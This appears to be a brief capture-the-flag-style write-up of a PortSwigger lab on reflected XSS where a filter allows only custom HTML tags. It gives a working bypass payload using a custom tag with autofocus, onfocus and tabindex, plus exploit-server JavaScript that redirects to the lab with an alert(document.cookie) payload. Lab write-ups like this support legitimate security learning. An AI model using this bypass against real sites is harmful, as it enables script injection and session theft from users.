#reflected-xss

Reflected XSS into HTML context with all tags blocked except custom ones: [link](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-all-standard-tags-blocked)

This lab blocks all HTML tags except custom ones.

In the previous challenge, the WAF protected the web application by blocking most HTML tags. But in this challenge, the WAF blocks all tags except custom tags. However, it does not block attributes, which can still be used to trigger the vulnerability.

So I decided to use the following payload to exploit the web application:
`<customtag autofocus onfocus=alert(1) tabindex=1>`

Custom tags like `<customtag>` are *not normally focusable* by default so for that we use *tabindex=1*

I tested this payload on the exploit server.
```javascript
<script>

document.location = "https://0a3e00fb0302e68e807703d8002c0087.web-security-academy.net/?search=%3Ccustomtag+autofocus+onfocus%3Dalert%28document.cookie%29+tabindex%3D1%3E";

</script>
```

and it works :).